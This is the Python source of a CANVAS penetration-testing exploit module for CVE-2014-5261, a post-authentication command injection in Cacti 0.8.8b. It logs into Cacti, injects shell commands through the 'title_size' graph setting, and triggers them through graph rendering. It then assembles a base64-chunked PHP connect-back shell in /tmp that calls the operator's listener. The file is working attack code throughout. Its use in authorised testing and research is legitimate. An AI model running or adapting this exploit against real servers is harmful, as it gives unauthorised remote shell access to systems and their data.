#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import os, socket, time, re, urllib2, cookielib, urllib, pprint, base64

import timeoutsocket
from exploitutils import *
import canvasengine

from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager
from phplistener import get_php_stage1

NAME        = "CVE-2014-5261"
DESCRIPTION = "Post-Auth CMDi in Cacti 0.8.8b"
VERSION     = "1.0"

DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "The Cacti Group"
DOCUMENTATION["Date public"]   = "08/12/14"
DOCUMENTATION["CERT Advisory"] = "None"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://seclists.org/oss-sec/2014/q3/351"
DOCUMENTATION["CVE Name"]      = "CVE-2014-5261"
DOCUMENTATION["CVE Url"]       = "https://security-tracker.debian.org/tracker/CVE-2014-5261"
DOCUMENTATION["Changelog"]     = "http://svn.cacti.net/viewvc?view=rev&revision=7454"
DOCUMENTATION["Notes"]         = """

This is a post-authentication command injection vulnerability in Cacti 0.8.8b,
valid credentials with the permissions to update the 'Global Settings' are required
for this module to execute successfully. This CMDi is blind and you will not see
the results of your commands.

This exploit will modify a graph setting in order to achieve command execution.
To do this we first fetch the settings so we can later restore them, modify the
value to achieve command execution, then adjust the settings back. The 'title_font'
value of the settings table  in the Cacti MySQL database is temporarily modified.
While the exploit is running graphs may fail to render and errors may be generated
server side, normal run time for this exploit is ~30s.

Because the payload is sent into a database we have to deal with encoding,
this limits the ability to use quotes.

Note: the automatic shell startup option will only work when the Cacti host is
Linux, the option to supply a command should be universal.
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Web Exploits"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [["Linux"]]
PROPERTY["VERSION"] = []

targets = {}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name        = NAME
        self.debug       = False
        self.ssl         = None
        self.url         = None
        self.username    = None # This is Post-Auth
        self.password    = None
        self.hostname    = None
        self.cmd         = None # Allow for user specified commands
        self.shellChunks = []   # We split our b64'd shell into 50 byte chunks to write out to the file system

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True" or self.ssl != "true":
            self.ssl = False

        self.getarg("url")
        if "/index.php" in self.url:
            self.url.replace("/index.php", "/")
        if self.url[-1] != "/":
             self.url = self.url + "/"

        self.getarg("hostname")
        self.getarg("username")
        self.getarg("password")

        self.getarg("cmd")
        if self.cmd and ("\"" in self.cmd or "'" in self.cmd):
            self.log("WARNING: quotes detected in your command, the command is SQLi escaped so this may foul your payload")
        elif self.cmd and self.cmd == "(optional)":
            # Passed by default from the GUI
            self.cmd = None

        self.node = self.argsDict["passednodes"][0]
        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "=" * 10
        print "Post-auth command injection exploit in Cacti v0.8.8b"
        print "-O hostname:cacti.somehost.org or ww.xx.yy.zz"
        print "-O url:/path/to/cacti" # Exclude index.php
        print "-O ssl:<True/False>"
        print "-O username:<username> # User requires the 'global settings' permission"
        print "-O password:<password>"
        print "-O cmd:<custom command to execute>"
        print "=" * 10

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like a Cacti page
        """
        # Make the request
        try:
            if self.ssl:
                testUrl = "https://" + self.hostname + self.url + "index.php"
            else:
                testUrl = "http://" + self.hostname + self.url + "index.php"
            testRet = urllib.urlopen(testUrl)
        except IOError as e:
            self.log("[EE] Failed to connect to provided URL: %s" % testUrl)
            self.log("[EE] " + str(e.strerror))
            return False

        # Test the results
        if testRet.code != 200:
            self.log("[ii] Received an HTTP STATUS CODE of: %d" % testRet.code)
        if re.search("Cacti user", testRet.read(), re.IGNORECASE):
            self.log("[ii] Found the Cacti login page, proceeding")
            self.url = testUrl
            return True
        else:
            self.log("[EE] Didn't find the expected Cacti page, aborting")
        self.log("[EE] Visit: %s and ensure it is the Cacti login page" % testUrl)
        return False

    def loginToCacti(self):
        """
        This is post-auth so we'll need to log in
        """
        if not self.username and not self.password:
            self.log("[EE] A username and password are required for this exploit")
            return False
        self.log("[ii] Attempting to log in as user: %s with password: %s" % (self.username, self.password))
        data = urllib.urlencode({"action"         : "login",
                                 "login_username" : self.username,
                                 "login_password" : self.password})
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        r = opener.open(self.url)
        if r.code == 200:
            r2 = opener.open(self.url, data)
            text = r2.read()
            if re.search("Logged in as", text):
                self.log("[+] Successful login, running permissions check")
                if self.permissionCheck(opener):
                    return opener
            else:
                self.log("[EE] Unable to log in with provided credentials")
        else:
            self.log("[EE] Unable to fetch page")
        return False

    def permissionCheck(self, opener):
        """
        Can we hit the settings.php page?
        """
        settingsUrl = self.url.replace("index.php", "settings.php")
        ret = opener.open(settingsUrl)
        if ret:
            data = ret.read()
            if re.search("auth_deny", data):
                self.log("[EE] This account does not have the required permissions")
                return False
            elif re.search("Cacti Settings", data):
                self.log("[ii] Able to view the settings page!")
                return True
            else:
                self.log("[EE] An unexpected page was returned at %s" % settingsUrl)
                return False
        else:
            self.log("[EE] Unable to fetch %s" % settingsUrl)
        return False

    def findSettings(self, opener):
        """
        Find the configured settings
        """
        settingsUrl = self.url.replace("index.php", "settings.php?%s")
        params = urllib.urlencode({"tab" : "visual"})
        ret = opener.open(settingsUrl%params)
        defaultValues = {}
        defaultValues["action"] = "save"

        # Find all the form values in their original states and save them to a dictionary for later use
        for line in ret.read().splitlines():
            if ( (re.search("<input", line) or re.search("<select", line)) and re.search("value=", line) ):
                name = re.search("id='(.+?)'", line)
                value = re.search("value=['\"](.+?)['\"]", line)
                if name and value:
                    defaultValues[name.groups()[0]] = value.groups()[0]
        return defaultValues

    def resetForm(self, opener, defaultValues):
        """
        Reset the graph settings to their original values
        """
        settingsUrl = self.url.replace("index.php", "settings.php")
        postVars = urllib.urlencode(defaultValues)
        resetRet = opener.open(settingsUrl, postVars)
        if resetRet.code == 200:
            self.log("[ii] Successfully reset graphing config values")
            return True
        return False

    def seedForm(self, opener, command):
        """
        First step is to POST the command to the form
        """
        settingsUrl = self.url.replace("index.php", "settings.php")
        postVars = {"num_rows_graph"              : 30,
                    "max_title_graph"             : 80,
                    "max_data_query_field_length" : 15,
                    "default_graphs_new_dropdown" : "-2",
                    "num_rows_data_query"         : 30,
                    "num_rows_data_source"        : 30,
                    "max_title_data_soruce"       : 45,
                    "num_rows_device"             : 30,
                    "num_rows_log"                : 500,
                    "log_refresh_interval"        : 60,
                    "title_font"                  : "",
                    "legend_size"                 : 8,
                    "legend_font"                 : "",
                    "axis_size"                   : 7,
                    "axis_font"                   : "",
                    "unit_size"                   : 7,
                    "unit_font"                   : "",
                    "tab"                         : "visual",
                    "action"                      : "save"}
        if self.cmd:
            # User specified command
            postVars['title_size'] = "8;" + self.cmd + ";"
        else:
            # Our shell startup
            postVars['title_size'] = "8;" + command + ";"

        data = urllib.urlencode(postVars)
        r3 = opener.open(settingsUrl, data)
        if r3.code == 200:
            if self.cmd:
                self.log("[+] Added your command of: %s to the global settings" % self.cmd)
            else:
                self.log("[+] Added command for shell startup to the global settings")
            return opener
        else:
            self.log("[EE] Encounted an HTTP STATUS CODE of %d" % r3.code)
        self.log("[EE] Failed to update form, does this user have that right?")
        return False

    def trigger(self, opener):
        """
        By visiting this URL we force the server to generate a new graph and hit the vulnerability
        """
        params = urllib.urlencode({"local_graph_id" : "1"}) # It is probable that this graph will always exist
        triggerUrl = self.url.replace("index.php", "graph_image.php?%s")
        r4 = opener.open(triggerUrl % params)

        # The server will render us an image even in some failure cases
        if r4.headers.has_key('Content-Type') and r4.headers['Content-Type'] == "image/png":
            self.log("[ii] Trigger sent")
            return True
        else:
            # If we see no image then we definitely hit an error
            self.log("[EE] Got an error back from the server when triggering, browse to the graphs tab manually")
            return False
        return False

    def generateCommands(self):
        """
        Create the list of commands we'll be executing to get a connect back shell
        """
        # Create a list to store our commands in order of execution
        commands = [
                     "rm -f /tmp/x* test*" # Delete previous attempts
                   ]

        # Create the PHP callback
        host = self.callback.ip
        port = self.callback.port
        badchars = ""

        # If you're using a custom PHP shell, add it here
        ret = "<?php " + get_php_stage1(badchars, host, port) + " ?>"
        phpCallback = base64.b64encode(ret)

        # Split out b64'd callback into 50 byte chunks
        for x in xrange(0, len(phpCallback), 50):
            self.shellChunks.append(phpCallback[x:x + 50])

        # Dump those chunks into files
        x = 0
        for chunk in self.shellChunks:
            commands.append("echo %s >> /tmp/x%d" % (chunk, x))
            x += 1

        # Concatinate files while removing newlines
        tempCmd = " cd /tmp; head -c -1 -q "
        for y in xrange(0, x):
            tempCmd += "x%d " % y
        tempCmd += "> /tmp/test"
        commands.append(tempCmd)

        # Unbase64 the callbcak
        commands.append("base64 -d /tmp/test > /tmp/test.php")

        # Run it
        commands.append("php /tmp/test.php")
        return commands

    def suppliedCommand(self, opener, defaultValues):
        """
        Run the users supplied command, do error handling
        """
        triggerOpener = self.seedForm(opener, None)
        if triggerOpener:
            success = self.trigger(triggerOpener)
        else:
            self.log("[EE] Unable to update form, does this user have that privilege?")

        if opener and self.resetForm(opener, defaultValues):
            self.log("[ii] Updated form values to their originals")
        else:
            self.log("[ii] Unable to reset form values back to originals")
        return success

    def getShell(self, opener, defaultValues):
        """
        User has elected for us to obtain a CANVAS callback
        """
        commands = self.generateCommands()

        try:
            for command in commands:
                self.log("[ii] command: %s" % command) # Debug
                triggerOpener = self.seedForm(opener, command)
                if triggerOpener:
                    success = self.trigger(triggerOpener)
                else:
                    raise ValueError("[EE] Unable to update form")
        except ValueError as e:
            self.log(e.args[0])

        if opener and self.resetForm(opener, defaultValues):
            self.log("[ii] Updated form values to their originals")
        else:
            self.log("[ii] Unable to reset form values back to originals")

        return success

    def run(self):
        success = False
        self.getargs()
        if self.testUrl():
            opener = self.loginToCacti()
            if opener:
                defaultValues = self.findSettings(opener)
                if self.cmd:
                    success = self.suppliedCommand(opener, defaultValues)
                else:
                    success = self.getShell(opener, defaultValues)
            else:
                # Unable to log in
                pass
        else:
            self.log("[EE] Unable to connect to site")


        if not success:
            return 0
        return 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
